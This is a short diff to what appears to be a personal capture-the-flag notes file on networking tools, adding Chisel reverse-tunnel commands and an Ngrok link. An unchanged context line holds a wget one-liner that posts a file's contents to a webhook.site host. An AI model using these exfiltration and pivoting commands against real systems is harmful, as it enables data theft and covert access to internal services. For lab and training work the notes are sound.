@@ -7,8 +7,18 @@
   - receive remote connections
   - `wget https://webhook.site/[id] --post-data="$(cat flag)"`
 
-- https://ngrok.com/
+- [Ngrok](https://ngrok.com/)
   - reverse proxy, connect localhost and internet
+- [Chisel](https://github.com/jpillora/chisel)
+  - A fast TCP/UDP tunnel over HTTP
+  - example use:
+    - server:
+      - `./chisel server -p 8001 --reverse`
+    - client:
+      - `./chisel client 10.10.14.13:8001 R:socks`
+      - commonly used inside of docker container to tunnel unexposed service to our local environment
+        - use proxy 1080 in local browser to find docker ip 172.17.0.1 directly, or whatever port is required, 172.17.0.1:3000
+        - might have to add the ip 172.17.0.1 to /etc/hosts
 
 ## Quality of life
 
